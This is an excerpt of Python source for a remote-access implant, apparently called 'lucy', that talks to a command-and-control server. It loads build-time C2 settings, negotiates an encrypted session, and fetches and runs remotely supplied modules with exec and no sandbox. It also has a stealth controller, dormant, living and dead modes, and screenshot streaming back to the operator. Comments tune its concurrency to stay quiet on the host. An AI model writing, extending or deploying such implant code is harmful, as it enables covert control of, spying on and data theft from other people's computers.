...
# Allow agent modules to import the main module as "agent" for callbacks
sys.modules.setdefault("agent", sys.modules[__name__])


def set_mode(mode: str) -> dict:
    """Switch agent runtime mode: dormant, living, or dead."""
    import mode as _mode
    return _mode.set_mode(_config, _stop_event, mode)


_stealth_controller: Optional[object] = None
_offline_queue: Optional[object] = None

# Thread-safety: locks protecting mutable global state.
# These prevent race conditions when multiple WS messages or HTTP
# heartbeat threads access shared state concurrently.
_active_ws_lock = threading.RLock()
_active_ws = None  # type: Optional[object]
_module_cache_lock = threading.RLock()

# Module loader with HMAC signature verification (initialized in main()).
# Replaces the raw exec() calls that were previously used for module loading.
_module_loader: Optional[object] = None

# Thread pool for task execution — prevents WS message loop from blocking
# and bounds the number of concurrent tasks.
_task_executor: Optional[object] = None  # concurrent.futures.ThreadPoolExecutor
...
def load_config(ini_path: str = "agent.ini") -> dict:
    ...
    try:
        ...
        for key, val in baked_map.items():
            if val is None:
                continue
            # Skip unreplaced build placeholders (e.g. {{C2_URL}})
            if isinstance(val, str) and val.startswith("{{") and val.endswith("}}"):
                continue
            config[key] = val
        # If critical baked values were placeholders (not replaced at build
        # time), fall through to INI/env fallback.
        baked_c2 = baked_map.get("c2_url")
        baked_key = baked_map.get("api_key")
        c2_is_placeholder = isinstance(baked_c2, str) and baked_c2.startswith("{{")
        key_is_placeholder = isinstance(baked_key, str) and baked_key.startswith("{{")
        if c2_is_placeholder or key_is_placeholder:
...
def load_module(name: str) -> dict | None:
    ...
    Uses ModuleLoader for HMAC signature verification and sandboxed exec.
    Falls back to legacy cache format for backward compatibility with
    execute_task() which expects {"namespace": ..., "version": ...}.
    """
    ...
    try:
        ...
        # Use ModuleLoader for signature verification + sandboxed exec
        if _module_loader is not None:
            try:
                cached = _module_loader.load(name, version, code, signature)
                entry = {"namespace": cached.namespace, "version": version}
                with _module_cache_lock:
                    _module_cache[name] = entry
                logger.info("Module '%s' v%s loaded (signed).", name, version)
                return entry
            except ValueError as exc:
                logger.error("Module '%s' signature verification FAILED: %s", name, exc)
                return None
            except RuntimeError as exc:
                logger.error("Module '%s' compile error: %s", name, exc)
                return None
        else:
            # Fallback: no loader configured (should not happen in production)
            logger.warning("ModuleLoader not initialized — using raw exec (UNSAFE)")
            namespace: dict = {
                "__name__": f"lucy_module_{name}",
                "__builtins__": __builtins__,
            }
            exec(compile(code, f"<module:{name}>", "exec"), namespace)
            entry = {"namespace": namespace, "version": version}
            with _module_cache_lock:
                _module_cache[name] = entry
            logger.info("Module '%s' v%s loaded (unsigned).", name, version)
            return entry
...
def execute_task(task: dict) -> dict:
    ...
    Uses a ThreadPoolExecutor when available to bound concurrency and
    avoid creating unbounded ad-hoc threads. Falls back to a single
    thread if the pool is not initialized.
    Returns result dict.
    """
    ...
    def _send_callback(out_msg: dict) -> None:
        """Send an out-of-band message (stream frames, errors) to C2."""
        if _active_ws is not None:
            try:
                _active_ws.send(json.dumps(out_msg))
            except Exception:
                pass
            ...
            if module in _LOCAL_MODULES:
                ...
                if callable(run_fn):
                    if module == "screenshot":
                        result_container.append(run_fn(action, send_callback=_send_callback, **params))
                    else:
    ...
    # Use ThreadPoolExecutor when available (bounded concurrency)
    if _task_executor is not None:
        try:
            future = _task_executor.submit(_run)
            future.result(timeout=timeout)
        except Exception as exc:
            # Timeout or execution exception
            if "Timeout" in str(type(exc).__name__) or isinstance(exc, TimeoutError):
                return {
                    "task_id": task_id,
                    "status": "failed",
            ...
            # Other exception from _run is already in error_container
    else:
        # Fallback: single thread (legacy behavior)
...
# Protected by _active_ws_lock to prevent race conditions when multiple
# connections or threads access it concurrently.
...
def _run_ws_with_lib(agent_id: str, ws_lib, ws_connected_event: threading.Event = None) -> None:
    ...
    def on_close(ws, code, msg):
        global _active_ws
        # Only clear if this ws is still the active one (prevents a stale
        # disconnect from clearing a newer connection — race fix).
        with _active_ws_lock:
            if _active_ws is ws:
                _active_ws = None
        if ws_connected_event:
...
def _cache_module_from_ws(payload: dict) -> None:
    ...
    if not (name and code):
        return
    # Use ModuleLoader for signature verification
    if _module_loader is not None:
        try:
            cached = _module_loader.load(name, version, code, signature)
            with _module_cache_lock:
                _module_cache[name] = {"namespace": cached.namespace, "version": version}
            logger.info("Module '%s' cached from WS (signed).", name)
        except ValueError as exc:
            logger.error("WS module '%s' signature verification FAILED: %s", name, exc)
        except RuntimeError as exc:
            logger.error("WS module '%s' compile error: %s", name, exc)
    else:
        logger.warning("ModuleLoader not initialized — rejecting WS module '%s'", name)
...
def _derive_module_hmac_key(aes_key: bytes) -> bytes:
    """Derive a stable HMAC key from the session AES key for module signing.

    Uses HKDF-like expansion with a fixed salt so that:
    - Only the C2 (which co-derives the AES key during ECDH) can sign modules.
    - The key is stable across reconnects within the same session.
    - The key is not the raw AES key (defense in depth).
    """
    import hashlib
    import hmac as _hmac
    salt = b"lucy-module-signing-v1"
    return _hmac.new(salt, aes_key, hashlib.sha256).digest()


def main() -> None:
    global _agent_id, _aes_key, _config, _stealth_controller, _offline_queue
    global _module_loader, _task_executor
    ...
    # Initialize ThreadPoolExecutor for bounded task concurrency.
    # max_workers=4 balances parallelism with stealth (too many concurrent
    # tasks would be noisy and could destabilize the host).
    from concurrent.futures import ThreadPoolExecutor
    _task_executor = ThreadPoolExecutor(
        max_workers=4,
        thread_name_prefix="lucy_task",
    )
    ...
    # Initialize ModuleLoader with HMAC key derived from the session AES key.
    # This ensures that only modules signed by the C2 (which knows the key
    # material) can be loaded and executed on the agent.
    from core.loader import ModuleLoader
    hmac_key = _derive_module_hmac_key(_aes_key)
    _module_loader = ModuleLoader(
        hmac_key=hmac_key,
        sandbox=False,  # modules need full builtins for OS interaction
        default_timeout=int(_config.get("task_timeout", 60)),
    )
    logger.info("ModuleLoader initialized with HMAC signature verification.")
